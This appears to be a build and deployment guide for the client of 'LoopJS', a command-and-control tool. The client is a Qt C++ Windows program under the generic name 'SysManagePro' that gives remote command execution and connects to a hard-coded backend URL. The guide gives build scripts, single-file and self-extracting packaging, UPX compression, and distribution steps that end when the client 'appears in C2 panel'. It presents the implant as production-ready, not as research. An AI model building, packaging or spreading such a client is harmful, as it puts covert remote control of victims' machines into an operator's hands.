# LoopJS Client Build Guide - Qt C++ Application

## 🎯 Client Overview
The LoopJS client is a Qt C++ desktop application that connects to the C2 panel via WebSocket.

### Key Features
- **Real-time Communication**: WebSocket connection to backend
- **System Monitoring**: Hardware and software information
- **Command Execution**: Remote command execution
- **Standalone Deployment**: Self-contained executable with all dependencies

## 🏗️ Build Environment

### Required Software
- **Qt 6.9.3**: MinGW 64-bit compiler
- **CMake**: 3.16 or later
- **MinGW**: Included with Qt
- **Windows**: Windows 10 or later

### Installation Paths
- **Qt**: `C:\Qt\6.9.3\mingw_64`
- **CMake**: System PATH or standalone installation
- **Project**: `clients/qt-client/`

## 🔧 Build Process

### Method 1: Using Build Scripts (Recommended)

#### Standalone Build
```bash
cd clients/qt-client
.\build-standalone.bat
```

#### Single Executable Build
```bash
cd clients/qt-client
.\create-final-single-exe.ps1
```

#### Self-Extracting Build
```bash
cd clients/qt-client
.\create-sfx-exe.ps1
```

### Method 2: Manual Build

#### Using CMake
```bash
cd clients/qt-client
mkdir build
cd build
cmake .. -G "MinGW Makefiles" -DCMAKE_BUILD_TYPE=Release
cmake --build . --config Release
```

#### Using Qt Creator
1. Open `clients/qt-client/CMakeLists.txt` in Qt Creator
2. Configure project with MinGW 64-bit
3. Build in Release mode

## 📦 Deployment Packages

### Package Types

#### 1. Standalone Package
- **Script**: `build-standalone.bat`
- **Output**: `dist/` directory
- **Contents**: Executable + all DLLs
- **Size**: ~34 MB

#### 2. Single Executable
- **Script**: `create-final-single-exe.ps1`
- **Output**: `final-single-exe/` directory
- **Contents**: Self-extracting executable
- **Size**: ~34 MB

#### 3. Self-Extracting Package
- **Script**: `create-sfx-exe.ps1`
- **Output**: `sfx-exe/` directory
- **Contents**: PowerShell-based extractor
- **Size**: ~34 MB

### Package Contents
```
dist/
├── SysManagePro.exe          # Main executable
├── Qt6Core.dll              # Qt Core library
├── Qt6Gui.dll               # Qt GUI library
├── Qt6Widgets.dll           # Qt Widgets library
├── Qt6WebSockets.dll        # Qt WebSockets library
├── Qt6Network.dll           # Qt Network library
├── libgcc_s_seh-1.dll       # GCC runtime
├── libstdc++-6.dll          # C++ standard library
├── libwinpthread-1.dll      # Windows threading
├── platforms/
│   └── qwindows.dll         # Windows platform plugin
└── tls/
    ├── qschannelbackend.dll # Windows TLS backend
    └── qcertonlybackend.dll # Certificate backend
```

## 🔐 SSL/TLS Configuration

### TLS Backend Setup
The client uses Windows SChannel for SSL/TLS support:

```batch
REM Copy TLS backends
copy "%QT_DIR%\plugins\tls\qschannelbackend.dll" dist\tls\
copy "%QT_DIR%\plugins\tls\qcertonlybackend.dll" dist\tls\
```

### SSL Configuration
- **Backend**: `wss://loopjs-backend-361659024403.us-central1.run.app/ws`
- **Protocol**: WebSocket Secure (WSS)
- **Certificates**: Windows certificate store

## 🚀 Build Scripts Explained

### build-standalone.bat
```batch
@echo off
echo Building Standalone SysManagePro

REM Set Qt environment
set QT_DIR=C:\Qt\6.9.3\mingw_64
set PATH=%QT_DIR%\bin;%PATH%

REM Copy executable and dependencies
copy build\SysManagePro.exe dist\
copy "%QT_DIR%\bin\*.dll" dist\
copy "%QT_DIR%\plugins\platforms\qwindows.dll" dist\platforms\
copy "%QT_DIR%\plugins\tls\*.dll" dist\tls\
```

### create-final-single-exe.ps1
```powershell
# PowerShell script to create single executable
param(
    [string]$InputExe = "dist\SysManagePro.exe",
    [string]$OutputExe = "SysManagePro-Final-Single.exe"
)

# Create self-extracting script
$SingleExeScript = @'
# SysManagePro - Single Executable with Embedded DLLs
# Extract files to temp directory and run
'@
```

## 🐛 Common Build Issues

### Issue 1: CMake Not Found
**Error**: `'cmake' is not recognized as an internal or external command`
**Solution**:
```bash
# Install CMake
winget install Kitware.CMake

# Or use existing build
.\build-standalone.bat
```

### Issue 2: Qt Not Found
**Error**: `Qt6Core.dll was not found`
**Solution**:
```bash
# Check Qt installation
dir "C:\Qt\6.9.3\mingw_64\bin\Qt6Core.dll"

# Update Qt path in scripts
set QT_DIR=C:\Qt\6.9.3\mingw_64
```

### Issue 3: SSL/TLS Issues
**Error**: `No functional TLS backend was found`
**Solution**:
```bash
# Include TLS backends
copy "C:\Qt\6.9.3\mingw_64\plugins\tls\qschannelbackend.dll" dist\tls\
copy "C:\Qt\6.9.3\mingw_64\plugins\tls\qcertonlybackend.dll" dist\tls\
```

### Issue 4: Build Failures
**Error**: Compilation errors
**Solution**:
```bash
# Clean and rebuild
rmdir /s /q build
mkdir build
cd build
cmake .. -G "MinGW Makefiles"
cmake --build . --config Release
```

## 📊 Build Optimization

### UPX Compression
```bash
# Compress executable
upx --best --lzma SysManagePro.exe
```

### Static Linking
```cmake
# CMakeLists.txt
set(CMAKE_CXX_FLAGS "-static -static-libgcc -static-libstdc++")
set(CMAKE_EXE_LINKER_FLAGS "-static -static-libgcc -static-libstdc++")
```

### Release Build
```cmake
# Release configuration
set(CMAKE_BUILD_TYPE Release)
set(CMAKE_CXX_FLAGS_RELEASE "-O3 -DNDEBUG -s")
```

## 🔍 Testing & Validation

### Local Testing
```bash
# Run executable
.\dist\SysManagePro.exe

# Check WebSocket connection
# Should connect to: wss://loopjs-backend-361659024403.us-central1.run.app/ws
```

### Deployment Testing
```bash
# Test on clean Windows machine
# Copy dist/ folder
# Run SysManagePro.exe
# Verify C2 panel shows client
```

### Validation Checklist
- [ ] Executable runs without errors
- [ ] WebSocket connection established
- [ ] Client appears in C2 panel
- [ ] SSL/TLS connection works
- [ ] No external dependencies required

## 📝 Build Configuration

### CMakeLists.txt
```cmake
cmake_minimum_required(VERSION 3.16)
project(SysManagePro VERSION 0.1 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

find_package(QT NAMES Qt6 Qt5 REQUIRED COMPONENTS Widgets WebSockets Network)
find_package(Qt${QT_VERSION_MAJOR} REQUIRED COMPONENTS Widgets WebSockets Network)

qt_add_executable(SysManagePro
    MANUAL_FINALIZATION
    main_debug.cpp
    mainwindow.cpp
    mainwindow.h
    FileDownloader.h
    DownloadThread.h
)

target_link_libraries(SysManagePro PRIVATE 
    Qt${QT_VERSION_MAJOR}::Widgets 
    Qt${QT_VERSION_MAJOR}::WebSockets 
    Qt${QT_VERSION_MAJOR}::Network
)
```

### Build Scripts
- **build-standalone.bat**: Creates standalone package
- **create-final-single-exe.ps1**: Creates single executable
- **create-sfx-exe.ps1**: Creates self-extracting package
- **setup-ssl.ps1**: Downloads OpenSSL (alternative)

## 🎯 Production Deployment

### Final Package
- **File**: `SysManagePro-Final-Single-Package.zip`
- **Size**: ~13.7 MB
- **Contents**: Single executable + launcher script
- **Deployment**: Extract and run `SysManagePro-Final-Single.bat`

### Distribution
1. **Download**: `SysManagePro-Final-Single-Package.zip`
2. **Extract**: All files to target directory
3. **Run**: `SysManagePro-Final-Single.bat`
4. **Verify**: Client appears in C2 panel

---

**Last Updated**: October 1, 2025
**Status**: Production Ready
**Version**: 1.0.0
